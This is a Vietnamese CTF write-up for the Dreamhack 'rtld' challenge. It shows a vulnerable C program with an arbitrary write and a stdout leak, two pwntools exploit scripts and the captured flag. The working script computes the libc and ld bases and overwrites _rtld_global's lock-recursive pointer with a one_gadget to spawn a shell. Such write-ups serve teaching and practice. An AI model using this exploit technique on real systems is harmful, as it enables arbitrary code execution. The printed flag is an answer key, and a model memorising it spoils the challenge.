# rtld

1 chall khá lạ và mới về **kĩ thuật rtld_global Overwrite**

**dreamhack:** https://learn.dreamhack.io/11#14

## source C:

```c 
// gcc -o rtld rtld.c -fPIC -pie

#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
#include <dlfcn.h>

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(60);
}

void get_shell() {
    system("/bin/sh");
}

int main()
{
    long addr;
    long value; 

    initialize();

    printf("stdout: %p\n", stdout);

    printf("addr: ");
    scanf("%ld", &addr);

    printf("value: ");
    scanf("%ld", &value);

    *(long *)addr = value;
    return 0;
}

```

**checks:**

![image](https://github.com/gookoosss/CTF/assets/128712571/8f0f8cbf-6759-44f2-aef5-4d2559bcd2c3)


ở đây có canary rồi ko thể BOF được, ta lại ko thể leak được địa chỉ stack để có thể lấy được địa chỉ rip

**=> hàm get_shell dường như vứt đi**

ở tới đây mình nảy ra 1 ý tưởng khá hay đó **tấn công .fini_array** vì ta có thể leak được nó dễ dàng kết hợp với one_gadget

## Test:

```python 
#!/usr/bin/env python3

from pwn import *

exe = ELF("./rtld_patched")
libc = ELF("./libc-2.23.so")
ld = ELF("./ld-2.23.so")
# r = remote("addr", 1337)
context.binary = exe
p = process([exe.path])


gdb.attach(p, gdbscript = '''
b*main+58    
b*main+99    
b*main+140    
c           
''')

input()

p.recvuntil('stdout: ')
libc_leak = int(p.recvline()[:-1], 16)
libc.address = libc_leak - 0x3c5620
finit = libc.address + 0x5f1168
ld.address = libc_leak + 0x49e0
ld_global = ld.address + 0x226040

# 0x201dd8

log.info('libc leak: ' + hex(libc_leak))
log.info('libc base: ' + hex(libc.address))
log.info('finit leak: ' + hex(finit))
log.info('ld base: ' + hex(ld.address))

one_gadget = libc.address + 0xf1247

p.sendlineafter(b'addr: ', str(finit))
p.sendlineafter(b'value: ', str(one_gadget - 0x201dd8))

p.interactive()


```

ban đầu nghĩ cách này sẽ hiệu quả nhưng ko lấy shell được

sau đó thì mình có nghiên cứu **tài liệu về kĩ thuật rtld_global Overwrite** từ nhiều nguồn thì **mình tạm hiểu sơ theo ý mình như này:**
- như ta đã biết thì khi kết thúc chương trình thì **địa chỉ base sẽ cộng thêm offset để trỏ đến địa chỉ .fini_array thực thi lên exit()** nhằm kết thúc dữ liệu và xóa bộ đệm
- **.fini_array thì nhằm trong _rtld_global**, nên chương trình sẽ đi vào **_rtld_global** trước rồi mới vào **.fini_array**

![image](https://github.com/gookoosss/CTF/assets/128712571/7e411185-2240-4ba0-ba21-940f985db5d2)



- trong tài liệu có nói lý do là **Relro bật**, nên k**hi vào _rtld_global thì nó chưa kịp đến .fini_array thì đã end chương trình**, nên sử dụng cách tấn công .fini_array là không thực thi được

![image](https://github.com/gookoosss/CTF/assets/128712571/25ac20aa-9c46-4aae-b485-a680fbee6b4d)


**tài liệu mình tham khảo:** 

https://aidencom.tistory.com/158

oke bây giờ ta chỉ còn 1 cách duy nhất là **dùng kĩ thuật rtld_global Overwrite** thôi

chương trình cho ta địa chỉ stdout nên **ta có thể leak libc, ld, rtld_global và rtld_lock_recursive**

lần nhập 1 ta thay vì ta nhập địa chỉ trỏ đến **fini_array** như ta hay làm thì giờ ta sẽ nhập địa chỉ **rtld_lock_recursive**, sau đó lần nhập 2 ta sẽ nhập **one_gadget** là lấy shell thôi

![image](https://github.com/gookoosss/CTF/assets/128712571/3e965058-3730-4058-989f-377251fc6721)



**(thật ra thì cách giải bài này trên dreamhack đã giải thích và hướng dẫn chi tiết rồi nên các có thể đọc thêm)**

**dreamhack:** https://learn.dreamhack.io/11#14

## script:
```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./rtld_patched")
libc = ELF("./libc-2.23.so")
ld = ELF("./ld-2.23.so")
# p = remote("host3.dreamhack.games", 24552)
context.binary = exe
p = process([exe.path])


gdb.attach(p, gdbscript = '''
b*main+58    
b*main+99    
b*main+140    
c           
''')

input()

p.recvuntil('stdout: ')
libc_leak = int(p.recvline()[:-1], 16)
libc.address = libc_leak - 0x3c5620
ld.address = libc_leak + 0x49e0
ld_global = ld.address + 0x226040
recursive = ld.address + 0x226f48

log.info('libc leak: ' + hex(libc_leak))
log.info('libc base: ' + hex(libc.address))
log.info('ld base: ' + hex(ld.address))
log.info('recursive: ' + hex(recursive))

one_gadget = libc.address + 0xf1247


p.sendlineafter(b'addr: ', str(recursive))
p.sendlineafter(b'value: ', str(one_gadget))


p.interactive()

# DH{e8992639751efccc8aed4a007c3b50542f352cb7b564418c1db1edbc5a87c4f0}

```

## Flag
 
DH{e8992639751efccc8aed4a007c3b50542f352cb7b564418c1db1edbc5a87c4f0}





